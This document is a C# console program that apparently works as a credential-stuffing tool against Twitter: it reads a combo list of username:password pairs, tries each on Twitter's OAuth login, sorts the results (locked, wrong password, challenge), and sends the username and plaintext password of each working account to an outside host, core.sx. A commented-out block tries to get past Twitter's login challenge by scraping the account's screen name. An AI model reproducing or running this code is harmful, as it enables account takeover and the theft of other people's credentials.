using System;
using RestSharp;
using System.Net;
using System.IO;

namespace Corecode_Twitter
{
    class Program
    {
        public static int total_done = 0;
        public static int valid_done = 0;
        static void Main(string[] args)
        {

            Console.Write("Combo List Path: ");
            string combolist = Console.ReadLine();


            StreamReader ImportFile = new StreamReader(combolist);
            string line;

            while ((line = ImportFile.ReadLine()) != null)
            {
                total_done++;
                string[] Account = line.Split(':');
                string username_or_email = Account.Length >= 1 ? Account[0] : null;
                string password = Account.Length >= 2 ? Account[1] : null;

                Console.WriteLine(addTwitter(username_or_email, password));
            }
            Console.WriteLine(String.Format("[LAST=DONE] Done: {0}, added {1}", total_done.ToString(), valid_done.ToString()));
            Console.WriteLine();
        }

        private static string addTwitter(string username_or_email, string password)
        {
            
            WebClient coreSX = new WebClient();
            string oauth_token = coreSX.DownloadString("http://core.sx/Twitter/requestUrl.php");

            CookieContainer Cookies = new CookieContainer();
            RestClient Twitter = new RestClient("https://api.twitter.com");

            RestRequest new_authenticity_token = new RestRequest("/oauth/authorize?oauth_token=" + oauth_token);
            var post_values = Twitter.Get(new_authenticity_token);
            string authenticity_token = getBetween(post_values.Content, "name=\"authenticity_token\" type=\"hidden\" value=\"", "\">");

            foreach (var cookie in post_values.Cookies)
            {
                Cookies.Add(new Cookie(cookie.Name, cookie.Value, cookie.Path, cookie.Domain));
            }
            Twitter.CookieContainer = Cookies;


            RestRequest oauth_authorize = new RestRequest("/oauth/authorize", Method.POST);
            oauth_authorize.AddParameter("authenticity_token", authenticity_token);
            oauth_authorize.AddParameter("redirect_after_login", "https://api.twitter.com/oauth/authorize?oauth_token=" + oauth_token);
            oauth_authorize.AddParameter("oauth_token", oauth_token);
            oauth_authorize.AddParameter("session[username_or_email]", username_or_email);
            oauth_authorize.AddParameter("session[password]", password);
            var verifier_oauth = Twitter.Post(oauth_authorize);

            string account_information = String.Format("[{2}={3}] {0}: ", username_or_email, new string('*', password.Length), authenticity_token, oauth_token);

            if (verifier_oauth.Content.Contains("https://support.twitter.com/articles/63510"))
                return account_information + "Your IP is currently locked for 1 hour. Please change your IP and press a key to proceed";

            else if (verifier_oauth.Content.Contains("login-challenge-form"))
            {
                /*//Console.WriteLine(verifier_oauth.Content);
                string user_id = getBetween(verifier_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
                string second_authenticity_token = getBetween(verifier_oauth.Content, "name=\"authenticity_token\" value=\"", "\"/>");
                string challenge_id = getBetween(verifier_oauth.Content, "name=\"challenge_id\" value=\"", "\"/>");

                string hack_user_id = coreSX.DownloadString("https://twitter.com/intent/user?user_id=" + user_id);
                string screen_name = getBetween(hack_user_id, "name=\"screen_name\" value=\"", "\">");
                //Console.WriteLine(user_id + second_authenticity_token + challenge_id + screen_name);

                RestRequest login_challenge = new RestRequest("/account/login_challenge", Method.POST);
                login_challenge.AddParameter("authenticity_token", second_authenticity_token);
                login_challenge.AddParameter("challenge_id", challenge_id);
                login_challenge.AddParameter("user_id", user_id);
                login_challenge.AddParameter("challenge_type", "RetypeScreenName");
                login_challenge.AddParameter("platform", "web");
                login_challenge.AddParameter("redirect_after_login", "/");
                login_challenge.AddParameter("remember_me", "true");
                login_challenge.AddParameter("challenge_response", screen_name);
                var unlocked_account = Twitter.Post(login_challenge);

                Console.WriteLine(unlocked_account.Content);

                RestRequest oauth2_authorize = new RestRequest("/oauth/authorize", Method.POST);
                oauth2_authorize.AddParameter("authenticity_token", authenticity_token);
                oauth2_authorize.AddParameter("redirect_after_login", "https://api.twitter.com/oauth/authorize?oauth_token=" + oauth_token);
                oauth2_authorize.AddParameter("oauth_token", oauth_token);
                oauth2_authorize.AddParameter("session[username_or_email]", username_or_email);
                oauth2_authorize.AddParameter("session[password]", password);
                var verifie2r_oauth = Twitter.Post(oauth2_authorize);
                Console.WriteLine(verifie2r_oauth.Content);
                Console.ReadLine();*/
                return account_information +  "login-challenge-form";

            }

            else if (verifier_oauth.Content.Contains("account_identifier"))
                return account_information + "Account locked (account_identifier)";

            else if (verifier_oauth.Content.Contains("<div class=\"message\">"))
                return account_information + "Incorrect password";

            else if (verifier_oauth.Content.Contains("<title>Twitter / ?</title>"))
                return account_information + "Incorrect password";


            else if (verifier_oauth.Content.Contains("Twitter/requestUrl.php?oauth"))
            {
                valid_done++;
                string requestUrl = getBetween(verifier_oauth.Content, "Twitter/requestUrl.php?", "\"/>");
                string addAccount = coreSX.DownloadString(String.Format("http://core.sx/Twitter/requestUrl.php?{0}&login={1}:{2}", requestUrl, username_or_email, password));

                return account_information + addAccount;
            }
            else
            {
                Console.WriteLine(verifier_oauth.Content);
                Console.ReadLine();
                return account_information + "Idk what happend? Lol.";
            }
        }

        private static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return "";
            }
        }
    }
}
